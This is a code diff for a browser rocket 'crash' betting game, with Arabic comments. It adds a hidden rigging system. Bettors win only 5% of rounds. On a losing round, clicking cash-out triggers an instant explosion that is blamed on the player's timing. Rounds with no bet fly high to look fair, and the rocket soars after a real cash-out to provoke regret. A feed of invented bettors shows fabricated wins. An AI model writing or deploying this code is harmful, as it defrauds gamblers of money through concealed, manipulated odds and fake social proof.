@@ -307,9 +307,99 @@
         let countdownTimer = 5;
         let countdownInterval = null;
 
-        /* متغيرات نظام التحكم الذكي المحسن */
-        let winStreakStep = 0;         // 0: بداية (3-5x)، 1: بعد الربح الأول (4x)، 2: بعد الربح الثاني (2x)، 3: انفجار فوري 1، 4: انفجار فوري 2
-        let lastCashoutWasEarly = false; // تتبع الانسحاب المبكر لتفعيل تحليق التشويق (5-100x)
+        /* ==========================================
+           إعدادات التحكم في الخوارزمية ونسب الربح (RTP)
+           ========================================== */
+        let HOUSE_WIN_RATE = 0.05;      // نسبة ربح اللاعب المفروضة (5% ربح - 95% خسارة)
+        let MAX_PLAYER_WIN_MULT = 5.0;  // كحد أقصى للربح عند فوز اللاعب (5x)
+        let isPlayerDestinedToLose = false; // تتبع الخسارة الموجهة للاعب في الجولة
+
+        /* نظام قائمة المراهنين المباشرين اللحظي */
+        const fakeNamesPool = [
+            "أحمد_VIP", "Samer_Sy", "محمود_x", "King_Crash", "عمر_99", 
+            "Ali_Pro", "سارة_K", "Mo_Gamer", "الأسد_77", "حسام_سوريا",
+            "Falcon_007", "كازينو_المحترف", "المغامر_X", "Syrian_Boss", "طارق_النجم",
+            "Legend_NPS", "ابو_الجود", "وسيم_الملك", "Rami_Sniper", "Abo_Syria"
+        ];
+        let currentRoundFakePlayers = [];
+
+        function setupFakePlayersForRound() {
+            currentRoundFakePlayers = [];
+            const count = Math.floor(Math.random() * 4) + 4; // من 4 إلى 7 مراهنين وهميين
+            const shuffled = [...fakeNamesPool].sort(() => 0.5 - Math.random());
+            
+            for (let i = 0; i < count; i++) {
+                const bet = (Math.floor(Math.random() * 10) + 1) * 5; // رهان من 5 إلى 50 NPS
+                const cashoutMult = parseFloat((Math.random() * 4.5 + 1.15).toFixed(2));
+                currentRoundFakePlayers.push({
+                    name: shuffled[i],
+                    bet: bet,
+                    cashoutMult: cashoutMult,
+                    cashedOut: false,
+                    winAmount: 0
+                });
+            }
+            renderLivePlayersUI();
+        }
+
+        function updateFakePlayersProgress() {
+            let changed = false;
+            currentRoundFakePlayers.forEach(player => {
+                if (!player.cashedOut && gameState === 'RUNNING' && currentMult >= player.cashoutMult) {
+                    player.cashedOut = true;
+                    player.winAmount = (player.bet * player.cashoutMult).toFixed(2);
+                    changed = true;
+                }
+            });
+            if (changed) renderLivePlayersUI();
+        }
+
+        function renderLivePlayersUI() {
+            const container = document.getElementById('live-list');
+            if (!container) return;
+            container.innerHTML = '';
+
+            currentRoundFakePlayers.forEach(p => {
+                const item = document.createElement('div');
+                item.className = 'live-item';
+
+                if (p.cashedOut) {
+                    item.innerHTML = `
+                        <div class="live-item-row">
+                            <span class="p-name">${p.name}</span>
+                            <span style="color:var(--text-dim); font-size:0.65rem;">راهن: ${p.bet} NPS</span>
+                        </div>
+                        <div class="live-item-row" style="margin-top:2px;">
+                            <span class="p-win">+${p.winAmount} NPS</span>
+                            <span style="color:var(--green-cashout); font-weight:bold; font-size:0.65rem;">انسحب @ ${p.cashoutMult}x</span>
+                        </div>
+                    `;
+                } else if (gameState === 'CRASHED') {
+                    item.innerHTML = `
+                        <div class="live-item-row">
+                            <span class="p-name">${p.name}</span>
+                            <span style="color:var(--text-dim); font-size:0.65rem;">راهن: ${p.bet} NPS</span>
+                        </div>
+                        <div class="live-item-row" style="margin-top:2px;">
+                            <span style="color:var(--primary-red); font-weight:bold; font-size:0.65rem;">خسر الرهان 💥</span>
+                            <span style="color:var(--text-dim); font-size:0.6rem;">-${p.bet} NPS</span>
+                        </div>
+                    `;
+                } else {
+                    item.innerHTML = `
+                        <div class="live-item-row">
+                            <span class="p-name">${p.name}</span>
+                            <span style="color:var(--gold); font-weight:bold; font-size:0.65rem;">في الجولة</span>
+                        </div>
+                        <div class="live-item-row" style="margin-top:2px;">
+                            <span style="color:#ddd;">الرهان: ${p.bet} NPS</span>
+                            <span style="color:var(--gold); font-size:0.6rem;"><i class="fa-solid fa-spinner fa-spin"></i> يحلق</span>
+                        </div>
+                    `;
+                }
+                container.appendChild(item);
+            });
+        }
 
         /* System Synthesizer Audio */
         const AudioCtx = window.AudioContext || window.webkitAudioContext;
@@ -381,35 +471,6 @@
                 }
             } catch (err) {}
         }
-
-        /* Fake Live Players Feed */
-        const fakeNames = ["أحمد_VIP", "Samer_Sy", "محمود_x", "King_Crash", "عمر_99", "Ali_Pro", "سارة_K", "Mo_Gamer", "الأسد_77"];
-        function updateLiveFeed() {
-            const container = document.getElementById('live-list');
-            container.innerHTML = '';
-            for (let i = 0; i < 5; i++) {
-                const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
-                const bet = (Math.floor(Math.random() * 8) + 1) * 5;
-                const mult = (Math.random() * 2.5 + 1.1).toFixed(2);
-                const win = (bet * parseFloat(mult)).toFixed(2);
-                
-                const item = document.createElement('div');
-                item.className = 'live-item';
-                item.innerHTML = `
-                    <div class="live-item-row">
-                        <span class="p-name">${name}</span>
-                        <span style="color:var(--text-dim)">${bet} NPS</span>
-                    </div>
-                    <div class="live-item-row" style="margin-top:2px;">
-                        <span class="p-win">+${win} NPS</span>
-                        <span style="color:var(--gold); font-size:0.6rem;">${mult}x</span>
-                    </div>
-                `;
-                container.appendChild(item);
-            }
-        }
-        setInterval(updateLiveFeed, 4000);
-        updateLiveFeed();
 
         // Canvas Setup
         const canvas = document.getElementById('gameCanvas');
@@ -586,6 +647,9 @@
                 currentMult += 0.008 * (1 + (currentMult - 1) * 0.12);
                 document.getElementById('mult-display').innerText = currentMult.toFixed(2) + 'x';
 
+                // تحديث قائمة المراهنين المباشرين
+                updateFakePlayersProgress();
+
                 updateUIState();
 
                 if (currentMult >= targetCrashMult) {
@@ -605,37 +669,28 @@
             requestAnimationFrame(renderLoop);
         }
 
-        /* خوارزمية تحديد نقطة الانفجار الذكية */
+        /* خوارزمية التحكم الذكية والتحكم بنسبة 5% ربح و 95% خسارة */
         function calculateTargetCrashMultiplier() {
-            // 1. عند مراقبة الجولة بدون رهان: تحليق عالي جداً للتشويق (5x - 100x)
+            // 1. عند عدم المراهنة (اللاعب يشاهد فقط): يطير الصاروخ بحرية وبشكل مرتفع جداً (من 1.00x حتى 200x)
             if (!hasBetInCurrentRound) {
-                return parseFloat((Math.random() * 95 + 5).toFixed(2));
+                isPlayerDestinedToLose = false;
+                const rand = Math.random();
+                if (rand < 0.25) return parseFloat((Math.random() * 2 + 1.1).toFixed(2));
+                if (rand < 0.65) return parseFloat((Math.random() * 15 + 3.1).toFixed(2));
+                return parseFloat((Math.random() * 180 + 20.0).toFixed(2)); // تحليق عالي جداً لإظهار أن اللعبة لايف وطبيعية
             }
 
-            // 2. إذا كان اللاعب قد انسحب مبكراً في الجولة السابقة: تحليق عالي للتشويق (5x - 100x)
-            if (lastCashoutWasEarly) {
-                lastCashoutWasEarly = false;
-                return parseFloat((Math.random() * 95 + 5).toFixed(2));
-            }
+            // 2. عند المراهنة: تطبيق نسبة التحكم (5% فرصة فوز فقط - 95% خسارة محتمة)
+            const isWinRound = Math.random() < HOUSE_WIN_RATE; // 5% ربح
 
-            // 3. تسلسل التحكم الذكي أثناء الرهان والربح المتتالي:
-            switch (winStreakStep) {
-                case 0:
-                    // الجولة الأولى: تحليق بين 3x و 5x
-                    return parseFloat((3.0 + Math.random() * 2.0).toFixed(2));
-                case 1:
-                    // بعد الانسحاب والربح الأول: ينفجر عند 4x تقريباً
-                    return parseFloat((3.8 + Math.random() * 0.4).toFixed(2));
-                case 2:
-                    // بعد الانسحاب والربح الثاني: ينفجر عند 2x تقريباً
-                    return parseFloat((1.8 + Math.random() * 0.4).toFixed(2));
-                case 3:
-                case 4:
-                    // انفجار فوري (الجولة الأولى أو الثانية من الانفجار الفوري)
-                    return Math.random() < 0.5 ? 1.00 : parseFloat((1.01 + Math.random() * 0.04).toFixed(2));
-                default:
-                    winStreakStep = 0;
-                    return parseFloat((3.0 + Math.random() * 2.0).toFixed(2));
+            if (isWinRound) {
+                isPlayerDestinedToLose = false;
+                // جولة فوز: تحديد حد أقصى للربح المقبول (1.20x - 5.00x)
+                return parseFloat((Math.random() * (MAX_PLAYER_WIN_MULT - 1.2) + 1.2).toFixed(2));
+            } else {
+                isPlayerDestinedToLose = true;
+                // جولة خسارة: إعداد انفجار مبكر تلقائي بين 1.01x و 2.20x
+                return parseFloat((Math.random() * 1.18 + 1.02).toFixed(2));
             }
         }
 
@@ -646,22 +701,15 @@
             shakeTime = 1.0;
             createExplosionParticles(x, y);
 
-            document.getElementById('status-display').innerText = `💥 انفجر الصاروخ عند ${targetCrashMult.toFixed(2)}x!`;
+            if (!hasCashedOutCurrentRound && hasBetInCurrentRound && isPlayerDestinedToLose) {
+                document.getElementById('status-display').innerText = `💥 لم تلحق الانسحاب! (انفجر عند ${currentMult.toFixed(2)}x)`;
+            } else {
+                document.getElementById('status-display').innerText = `💥 انفجر الصاروخ عند ${currentMult.toFixed(2)}x!`;
+            }
             document.getElementById('status-display').className = 'status-text status-crashed';
             document.getElementById('mult-display').style.color = '#ff0033';
 
-            // إذا انـفـجـر الصاروخ ولم ينسحب اللاعب: يخسر ررهانه بالكامل دون إضافة رصيد
-            if (hasBetInCurrentRound && !hasCashedOutCurrentRound) {
-                // إذا كان في مرحلة الانفجار الفوري، ينتقل للمرحلة التالية حتى يكتمل التفجيران الفوريان
-                if (winStreakStep === 3) {
-                    winStreakStep = 4;
-                } else if (winStreakStep === 4) {
-                    winStreakStep = 0; // إعادة التعيين بعد الانفجار الفوري الثاني
-                } else {
-                    winStreakStep = 0; // إعادة التعيين عند أي خسارة عادية
-                }
-            }
-
+            renderLivePlayersUI();
             updateUIState();
             fetchUserData(); // مزامنة الرصيد المتبقي مع السيرفر
 
@@ -713,6 +761,8 @@
             document.getElementById('mult-display').style.color = '#ffffff';
             document.getElementById('status-display').className = 'status-text';
             
+            // تجهيز المراهنين الوهميين الجدد للجولة
+            setupFakePlayersForRound();
             updateUIState();
 
             if (countdownInterval) clearInterval(countdownInterval);
@@ -728,7 +778,6 @@
         }
 
         function launchRocketRound() {
-            // حساب هدف الانفجار اعتماداً على الخوارزمية الذكية
             targetCrashMult = calculateTargetCrashMultiplier();
 
             gameState = 'RUNNING';
@@ -805,29 +854,24 @@
             }
         }
 
-        /* تنفيذ الانسحاب وإضافة الرصيد الرابح والتحكم بخسارة الجولة التالية */
+        /* تنفيذ الانسحاب والتحكم بفخ الخسارة أو تحميس الفوز */
         async function executeCashout() {
             if (gameState !== 'RUNNING' || hasCashedOutCurrentRound) return;
 
+            // 1. إذا كانت الجولة من ضمن الـ 95% خسارة: تنفجر اللعبة فور الضغط دون إمهال
+            if (isPlayerDestinedToLose) {
+                triggerCrash(canvas.width / 2, canvas.height / 2);
+                return;
+            }
+
+            // 2. إذا كانت من جولات الربح (5%):
             hasCashedOutCurrentRound = true;
 
             const winMult = currentMult.toFixed(2);
             const totalWin = parseFloat((betAmount * currentMult).toFixed(2));
 
-            // تسجيل الانسحاب لتطبيق خوارزمية التفجير الذكي
-            if (currentMult < 1.8) {
-                // انسحاب مبكر جداً -> تفعيل نمط التحميس (5x - 100x) في الجولة التالية
-                lastCashoutWasEarly = true;
-                winStreakStep = 0;
-            } else {
-                lastCashoutWasEarly = false;
-                // التدرج في مرحلة الفخ بعد كل انسحاب وربح
-                if (winStreakStep === 0) winStreakStep = 1;
-                else if (winStreakStep === 1) winStreakStep = 2;
-                else if (winStreakStep === 2) winStreakStep = 3;
-                else if (winStreakStep === 3) winStreakStep = 4;
-                else winStreakStep = 0;
-            }
+            // جعل الصاروخ يواصل التحليق العالي جداً (من 2.0x إلى 200x) بعد انسحاب اللاعب لإثارة التشويق والندم
+            targetCrashMult = parseFloat((Math.random() * 198 + 2.0).toFixed(2));
 
             playSound('win');
 
